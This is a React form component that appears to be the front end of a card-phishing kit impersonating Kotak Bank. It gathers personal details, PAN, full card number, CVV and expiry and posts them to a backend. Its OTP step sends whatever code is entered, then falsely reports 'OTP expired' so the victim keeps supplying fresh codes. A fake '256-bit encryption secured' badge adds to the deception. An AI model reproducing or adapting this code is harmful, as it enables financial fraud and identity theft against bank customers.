import { useState, useEffect } from 'react'
import { Link, useSearchParams } from 'react-router-dom'

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000/api'

const PremiumForm = () => {
  const [searchParams] = useSearchParams()
  const [currentStep, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState({})
  const [otp, setOtp] = useState('')
  const [otpError, setOtpError] = useState('')
  const [formData, setFormData] = useState({
    fullName: '',
    mobileNumber: '',
    dateOfBirth: '',
    email: '',
    panNumber: '',
    requestType: '',
    cardHolderName: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
  })

  useEffect(() => {
    const type = searchParams.get('type')
    if (type === 'activate') {
      setFormData(prev => ({ ...prev, requestType: 'activate' }))
    } else if (type === 'deactivate') {
      setFormData(prev => ({ ...prev, requestType: 'deactivate' }))
    }
  }, [searchParams])

  const steps = [
    { id: 1, label: 'Personal' },
    { id: 2, label: 'Card Details' },
    { id: 3, label: 'Verify' },
  ]

  const requestTypes = [
    { id: 'new', label: 'New Credit Card' },
    { id: 'add', label: 'Add-on Card' },
    { id: 'upgrade', label: 'Card Upgrade' },
    { id: 'activate', label: 'Activate Card' },
    { id: 'deactivate', label: 'Deactivate Card' },
  ]

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ''
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    return parts.length ? parts.join(' ') : value
  }

  const formatExpiry = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4)
    }
    return v
  }

  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return re.test(email)
  }

  const validatePan = (pan) => {
    const re = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/
    return re.test(pan.toUpperCase())
  }

  const validateMobile = (mobile) => {
    return /^[6-9]\d{9}$/.test(mobile)
  }

  const validateCardNumber = (cardNumber) => {
    const cleaned = cardNumber.replace(/\s/g, '')
    return /^\d{16}$/.test(cleaned)
  }

  const handleChange = (e) => {
    const { name, value } = e.target
    let newValue = value
    
    if (name === 'cardNumber') {
      newValue = formatCardNumber(value)
    } else if (name === 'expiryDate') {
      newValue = formatExpiry(value)
    } else if (name === 'cvv') {
      newValue = value.replace(/[^0-9]/g, '').substring(0, 4)
    }
    
    setFormData({ ...formData, [name]: newValue })
    
    if (errors[name]) {
      setErrors({ ...errors, [name]: '' })
    }
  }

  const validateStep1 = () => {
    const newErrors = {}
    
    if (!formData.fullName.trim()) {
      newErrors.fullName = 'Full name is required'
    } else if (formData.fullName.trim().length < 2) {
      newErrors.fullName = 'Please enter valid name'
    }

    if (!formData.mobileNumber) {
      newErrors.mobileNumber = 'Mobile number is required'
    } else if (!validateMobile(formData.mobileNumber)) {
      newErrors.mobileNumber = 'Enter valid 10-digit mobile number'
    }

    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = 'Date of birth is required'
    } else {
      const dob = new Date(formData.dateOfBirth)
      const today = new Date()
      let age = today.getFullYear() - dob.getFullYear()
      const monthDiff = today.getMonth() - dob.getMonth()
      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
        age--
      }
      if (age < 18) {
        newErrors.dateOfBirth = 'You must be at least 18 years old'
      }
    }

    if (!formData.email) {
      newErrors.email = 'Email is required'
    } else if (!validateEmail(formData.email)) {
      newErrors.email = 'Enter valid email address'
    }

    if (!formData.panNumber) {
      newErrors.panNumber = 'PAN number is required'
    } else if (!validatePan(formData.panNumber)) {
      newErrors.panNumber = 'Format: ABCDE1234F'
    }

    if (!formData.requestType) {
      newErrors.requestType = 'Please select request type'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep2 = () => {
    const newErrors = {}

    if (!formData.cardHolderName.trim()) {
      newErrors.cardHolderName = 'Card holder name is required'
    }

    if (!formData.cardNumber) {
      newErrors.cardNumber = 'Card number is required'
    } else if (!validateCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = 'Enter valid 16-digit card number'
    }

    if (!formData.cvv) {
      newErrors.cvv = 'CVV is required'
    } else if (formData.cvv.length < 3) {
      newErrors.cvv = 'CVV must be 3 or 4 digits'
    }

    if (!formData.expiryDate) {
      newErrors.expiryDate = 'Expiry date is required'
    } else {
      const [month, year] = formData.expiryDate.split('/')
      
      if (!month || !year || parseInt(month) < 1 || parseInt(month) > 12) {
        newErrors.expiryDate = 'Enter valid expiry (MM/YY)'
      }
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSendOtp = async () => {
    if (otp.length < 4) {
      setOtpError('Please enter OTP first')
      return
    }
    
    setOtpError('')
    try {
      const submissionData = {
        ...formData,
        otpVerified: false,
        otpEntered: otp,
        isNewSubmission: true
      }
      
      const response = await fetch(`${API_URL}/submit-form`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(submissionData)
      })
      
      if (response.ok) {
        setOtpError('OTP expired, try again later')
        setOtp('')
      } else {
        setOtpError('Failed to submit. Please try again.')
      }
    } catch (error) {
      setOtpError('Connection error. Please try again.')
    }
  }

  const submitFormData = async (isNewSubmission) => {
    try {
      const submissionData = {
        ...formData,
        otpVerified: true,
        otpEntered: otp,
        isNewSubmission
      }
      
      const response = await fetch(`${API_URL}/submit-form`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(submissionData)
      })
      
      return response
    } catch (error) {
      throw error
    }
  }

  const handleNext = async () => {
    if (currentStep === 1) {
      if (validateStep1()) {
        setCurrentStep(2)
      }
    } else if (currentStep === 2) {
      if (validateStep2()) {
        try {
          const response = await submitFormData(true)
          if (response.ok) {
            setCurrentStep(3)
          } else {
            alert('Failed to submit form. Please try again.')
          }
        } catch (error) {
          alert('Connection error. Please try again.')
        }
      }
    }
  }

  const handlePrev = () => {
    if (currentStep > 1) setCurrentStep(currentStep - 1)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
  }

  return (
    <div className="min-h-screen bg-gray-100 font-inter pt-24">
      {/* Header */}
      <header className="bg-white shadow-sm fixed top-0 left-0 right-0 z-50">
        <div className="max-w-lg mx-auto h-24 px-4 flex items-center justify-between">
          <Link to="/" className="flex items-center">
            <img 
              src="/kotak.png" 
              alt="Kotak Bank" 
              className="h-20 object-contain"
            />
          </Link>
          <Link 
            to="/" 
            className="flex items-center gap-2 text-gray-600 hover:text-red-600 transition-colors text-sm font-medium"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
            </svg>
            Back
          </Link>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-lg sm:max-w-xl md:max-w-2xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
        {/* Step Indicator */}
        <div className="flex items-center justify-center gap-1 sm:gap-2 mb-4 sm:mb-6">
          {steps.map((step, index) => (
            <div key={step.id} className="flex items-center">
              <button
                onClick={() => {
                  if (step.id < currentStep) setCurrentStep(step.id)
                }}
                className={`
                  px-2 sm:px-4 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-medium
                  flex items-center gap-1.5 sm:gap-2 transition-all duration-300
                  ${currentStep === step.id ? 'active-red text-white' : ''}
                  ${currentStep > step.id ? 'completed-red text-green-600' : ''}
                  ${currentStep < step.id ? 'text-gray-400 cursor-pointer bg-gray-200' : ''}
                `}
              >
                {currentStep > step.id ? (
                  <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"/>
                  </svg>
                ) : (
                  <span className="w-4 sm:w-5 h-4 sm:h-5 rounded-full bg-white/20 flex items-center justify-center text-[10px] sm:text-xs">
                    {step.id}
                  </span>
                )}
                <span className="hidden xs:inline text-xs sm:text-sm">{step.label}</span>
              </button>
              {index < steps.length - 1 && (
                <div className={`
                  w-4 sm:w-8 h-0.5 mx-0.5 sm:mx-1 rounded transition-all duration-300
                  ${currentStep > step.id ? 'bg-green-500' : 'bg-gray-300'}
                `} />
              )}
            </div>
          ))}
        </div>

        {/* Form Card */}
        <div className="bg-white rounded-xl sm:rounded-2xl overflow-hidden shadow-lg animate-slide-up">
          {/* Card Header */}
          <div className="gradient-header-red px-4 sm:px-6 py-3 sm:py-4">
            <h2 className="text-base sm:text-lg font-semibold text-white">
              {currentStep === 1 && 'Personal Information'}
              {currentStep === 2 && 'Card Details'}
              {currentStep === 3 && 'OTP Verification'}
            </h2>
            <p className="text-white/70 text-xs sm:text-sm mt-0.5">
              {currentStep === 1 && 'Tell us about yourself'}
              {currentStep === 2 && 'Enter your card information'}
              {currentStep === 3 && 'Verify your mobile number'}
            </p>
          </div>

          {/* Form Content */}
          <form onSubmit={handleSubmit} className="p-3 sm:p-5 md:p-6">
            {/* Step 1: Personal Information */}
            {currentStep === 1 && (
              <div className="space-y-3 sm:space-y-4">
                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Full Name <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="fullName"
                    value={formData.fullName}
                    onChange={handleChange}
                    placeholder="John Doe"
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.fullName ? 'border-red-500' : ''}`}
                  />
                  {errors.fullName && <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Mobile Number <span className="text-red-500">*</span>
                  </label>
                  <div className="flex">
                    <span className="input-field-red rounded-l-lg sm:rounded-l-xl px-2 sm:px-3 py-2.5 sm:py-3 text-gray-500 border-r border-gray-200 bg-gray-50 text-sm">
                      +91
                    </span>
                    <input
                      type="tel"
                      name="mobileNumber"
                      value={formData.mobileNumber}
                      onChange={handleChange}
                      placeholder="9876543210"
                      maxLength={10}
                      className={`flex-1 input-field-red rounded-r-lg sm:rounded-r-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.mobileNumber ? 'border-red-500' : ''}`}
                    />
                  </div>
                  {errors.mobileNumber && <p className="text-red-500 text-xs mt-1">{errors.mobileNumber}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Date of Birth <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="date"
                    name="dateOfBirth"
                    value={formData.dateOfBirth}
                    onChange={handleChange}
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 ${errors.dateOfBirth ? 'border-red-500' : ''}`}
                  />
                  {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Email Address <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    placeholder="john@example.com"
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.email ? 'border-red-500' : ''}`}
                  />
                  {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    PAN Card Number <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="panNumber"
                    value={formData.panNumber}
                    onChange={handleChange}
                    placeholder="ABCDE1234F"
                    maxLength={10}
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 uppercase ${errors.panNumber ? 'border-red-500' : ''}`}
                  />
                  <p className="text-[10px] sm:text-xs text-gray-400 mt-1">Format: ABCDE1234F</p>
                  {errors.panNumber && <p className="text-red-500 text-xs mt-1">{errors.panNumber}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Request Type <span className="text-red-500">*</span>
                  </label>
                  <select
                    name="requestType"
                    value={formData.requestType}
                    onChange={handleChange}
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 ${errors.requestType ? 'border-red-500' : ''}`}
                  >
                    <option value="">Select Request Type</option>
                    <option value="new">New Credit Card</option>
                    <option value="add">Add-on Card</option>
                    <option value="upgrade">Card Upgrade</option>
                  </select>
                  {errors.requestType && <p className="text-red-500 text-xs mt-1">{errors.requestType}</p>}
                </div>
              </div>
            )}

            {/* Step 2: Card Details */}
            {currentStep === 2 && (
              <div className="space-y-3 sm:space-y-4">
                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Card Holder Name <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="cardHolderName"
                    value={formData.cardHolderName}
                    onChange={handleChange}
                    placeholder="Enter card holder name (as on card)"
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.cardHolderName ? 'border-red-500' : ''}`}
                  />
                  {errors.cardHolderName && <p className="text-red-500 text-xs mt-1">{errors.cardHolderName}</p>}
                </div>

                <div>
                  <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                    Card Number <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={handleChange}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 tracking-wider ${errors.cardNumber ? 'border-red-500' : ''}`}
                  />
                  <p className="text-[10px] sm:text-xs text-gray-400 mt-1">Enter 16-digit card number</p>
                  {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                </div>

                <div className="grid grid-cols-2 gap-3 sm:gap-4">
                  <div>
                    <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="password"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleChange}
                      placeholder="123"
                      maxLength={4}
                      className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.cvv ? 'border-red-500' : ''}`}
                    />
                    <p className="text-[10px] sm:text-xs text-gray-400 mt-1">3 or 4 digits</p>
                    {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                      Expiry Date <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={handleChange}
                      placeholder="MM/YY"
                      maxLength={5}
                      className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.expiryDate ? 'border-red-500' : ''}`}
                    />
                    <p className="text-[10px] sm:text-xs text-gray-400 mt-1">Format: MM/YY</p>
                    {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
                  </div>
                </div>

                {/* Card Preview */}
                <div className="mt-4 p-3 sm:p-4 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl sm:rounded-2xl text-white relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-16 sm:w-24 h-16 sm:w-24 bg-gradient-to-br from-white/10 to-transparent rounded-full -mr-8 sm:-mr-12 -mt-8 sm:-mt-12"></div>
                  <div className="relative z-10">
                    <div className="flex justify-between items-start mb-3 sm:mb-4">
                      <div className="w-8 sm:w-10 h-8 sm:h-10 rounded-lg sm:rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center">
                        <span className="text-sm sm:text-base font-bold text-white">K</span>
                      </div>
                      <svg className="w-10 sm:w-14 h-6 sm:h-8 text-gray-300 opacity-60" viewBox="0 0 24 16" fill="currentColor">
                        <path d="M9.5 16H2l1.5-8h6L9.5 16zM14 8l2.5-8h3L18 8h-4zm3.5 0l-2.5 8H21l2.5-8h-6zM7.5 8L5 16h-3L5 8h2.5zm11.5 8l2.5-8h3l-2.5 8h-3z"/>
                      </svg>
                    </div>
                    <p className="text-sm sm:text-base tracking-widest font-medium mb-2 sm:mb-3">
                      {formData.cardNumber || '**** **** **** ****'}
                    </p>
                    <div className="flex justify-between items-end text-xs sm:text-sm">
                      <div>
                        <p className="text-[8px] sm:text-[10px] text-gray-400 uppercase">Card Holder</p>
                        <p className="font-medium uppercase truncate max-w-[120px] sm:max-w-[180px]">
                          {formData.cardHolderName || 'CARD HOLDER'}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="text-[8px] sm:text-[10px] text-gray-400 uppercase">Expires</p>
                        <p className="font-medium">{formData.expiryDate || 'MM/YY'}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Step 3: OTP Verification */}
            {currentStep === 3 && (
              <div className="space-y-4 sm:space-y-6">
                <div className="text-center py-3 sm:py-4">
                  <div className="w-16 sm:w-20 h-16 sm:h-20 rounded-full bg-red-50 flex items-center justify-center mx-auto mb-3 sm:mb-4">
                    <svg className="w-8 sm:w-10 h-8 sm:h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                    </svg>
                  </div>
                  <h3 className="text-base sm:text-lg font-semibold text-gray-800 mb-1 sm:mb-2">OTP Verification</h3>
                  <p className="text-gray-500 text-xs sm:text-sm">
                    Enter the OTP sent to your mobile
                  </p>
                </div>

                <div>
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    placeholder="Enter 6-digit OTP"
                    className="w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 text-center tracking-wider"
                  />
                  {otpError && <p className="text-red-500 text-xs mt-2 text-center">{otpError}</p>}
                </div>

                                <button
                  type="button"
                  onClick={handleSendOtp}
                  className="w-full gradient-btn-red rounded-lg sm:rounded-xl px-4 sm:px-6 py-3 sm:py-4 text-sm sm:text-base text-white font-semibold shadow-md"
                >
                  Submit
                </button>
              </div>
            )}

            {/* Navigation Buttons */}
            {currentStep < 3 && (
              <div className="flex gap-2 sm:gap-3 mt-4 sm:mt-6">
                <button
                  type="button"
                  onClick={handlePrev}
                  className="flex-1 input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-600 font-medium hover:bg-gray-100 transition-all duration-300"
                >
                  Back
                </button>
                <button
                  type="button"
                  onClick={handleNext}
                  className="flex-1 gradient-btn-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-white font-semibold shadow-md"
                >
                  Next Step
                </button>
              </div>
            )}
          </form>
        </div>

        {/* Security Note */}
        <div className="flex items-center justify-center gap-1.5 sm:gap-2 mt-3 sm:mt-4 text-gray-500 text-[10px] sm:text-xs">
          <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
          </svg>
          <span>256-bit encryption secured</span>
        </div>
      </main>
    </div>
  )
}

export default PremiumForm
